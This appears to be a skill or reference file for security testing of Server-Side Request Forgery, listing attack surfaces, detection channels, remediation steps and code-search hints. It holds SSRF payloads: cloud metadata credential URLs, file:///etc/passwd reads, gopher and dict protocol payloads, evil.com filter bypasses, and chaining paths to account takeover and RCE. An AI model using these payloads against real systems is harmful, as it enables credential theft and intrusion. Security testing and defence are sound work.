---
name: ssrf
description: Server-Side Request Forgery testing covering basic, blind, and cloud metadata SSRF
category: vulnerabilities
version: "1.0"
tags: ["ssrf", "server-side", "cloud", "metadata", "owasp-a10"]
applies_to: ["AWS", "GCP", "Azure", "Kubernetes", "Docker", "Node.js", "Python", "Java", "Go", "PHP"]
severity: "HIGH"
confidence_threshold: "HIGH"
---
attack_surface:
  - "URL fetch endpoints (webhooks, image uploads, PDF generators)"
  - "API integrations with user-supplied URLs"
  - "Document processors (PDF, XML, Office) with external references"
  - "Image resizers, thumbnail generators"
  - "Import/export functionality with remote sources"
  - "OAuth/OIDC callback handlers"
  - "Proxy/forwarding endpoints"

detection_channels:
  - "Direct response: Internal service content in response"
  - "Blind: Time-based (delay), error-based, DNS/HTTP out-of-band"
  - "Cloud metadata: Instance identity, credentials, user-data"
  - "Port scanning: Internal service enumeration via response codes/times"
  - "Protocol smuggling: file://, dict://, gopher://, ftp://"

payload_primitives:
  localhost:
    - "http://127.0.0.1"
    - "http://127.0.0.1:22"
    - "http://127.0.0.1:80"
    - "http://127.0.0.1:3306"
    - "http://127.0.0.1:5432"
    - "http://127.0.0.1:6379"
    - "http://127.0.0.1:8080"
    - "http://127.0.0.1:9200"
    - "http://localhost"
    - "http://localhost:80"
  cloud_metadata:
    - "http://169.254.169.254/latest/meta-data/"
    - "http://169.254.169.254/latest/user-data/"
    - "http://169.254.169.254/latest/dynamic/instance-identity/document"
    - "http://metadata.google.internal/computeMetadata/v1/"
    - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    - "http://169.254.169.254/metadata/v1/"
    - "http://169.254.169.254/metadata/instance"
  private_networks:
    - "http://10.0.0.1"
    - "http://192.168.1.1"
    - "http://172.16.0.1"
    - "http://[::1]"
  special_protocols:
    - "file:///etc/passwd"
    - "file:///c:/windows/win.ini"
    - "dict://127.0.0.1:6379/info"
    - "gopher://127.0.0.1:25/"
    - "ftp://127.0.0.1/"
    - "ldap://127.0.0.1/"
  bypass_techniques:
    - "http://127.0.0.1@evil.com"
    - "http://127.0.0.1.evil.com"
    - "http://[::ffff:127.0.0.1]"
    - "http://2130706433"  # decimal IP
    - "http://0x7f000001"   # hex IP
    - "http://0177.0.0.1"   # octal IP
    - "http://localhost.evil.com"
    - "http://127.127.127.127"  # DNS rebinding
    - "http://127.0.0.1:80#@evil.com"
    - "http://user:pass@127.0.0.1"

false_positive_validation:
  - "Verify response contains actual internal service data (not generic error)"
  - "Check for cloud metadata specific fields (instance-id, ami-id, project-id)"
  - "Confirm blind SSRF via out-of-band (DNSLOG, Burp Collaborator, interactsh)"
  - "Validate port scan results with multiple probes"
  - "Ensure not a false positive from public CDN/proxy"
  - "Test with multiple protocols (HTTP, HTTPS, FTP, GOPHER)"

chaining_guidance:
  - "SSRF + Cloud Metadata → IAM credentials → Full account compromise"
  - "SSRF + Internal Admin Panel → Auth bypass → RCE"
  - "SSRF + Redis → Write webshell/cron → RCE"
  - "SSRF + PDF Generator → XXE/SSRF chain"
  - "Blind SSRF + DNS Rebinding → Bypass IP allowlist"
  - "SSRF + Kubernetes API → Cluster takeover"

remediation_patterns:
  - "Allowlist destinations (domain/IP) for outbound requests"
  - "Block private IP ranges (RFC1918, loopback, link-local, cloud metadata)"
  - "Enforce strict URL validation (scheme, host, port)"
  - "Use dedicated egress proxy with allowlist"
  - "Disable unnecessary protocols (file, dict, gopher, ftp)"
  - "Implement request timeout and size limits"
  - "Validate DNS responses (pin IPs, prevent rebinding)"
  - "Use cloud provider SSRF protection (AWS IMDSv2, GCP metadata headers)"

code_locations:
  - "Search for HTTP client calls with user-supplied URLs: `requests.get(url)`, `httpx.get(url)`"
  - "Look for URLFetch, HttpClient, OkHttp, axios, fetch with dynamic URLs"
  - "Check PDF libraries: wkhtmltopdf, puppeteer, playwright with user URLs"
  - "Find image processing: Pillow, ImageMagick, sharp with remote sources"
  - "Identify webhook receivers, callback handlers"
  - "Check XML parsers with external entity resolution"

references:
  - "https://owasp.org/www-project-top-ten/2017/A10_Server-Side_Request_Forgery"
  - "https://portswigger.net/web-security/ssrf"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"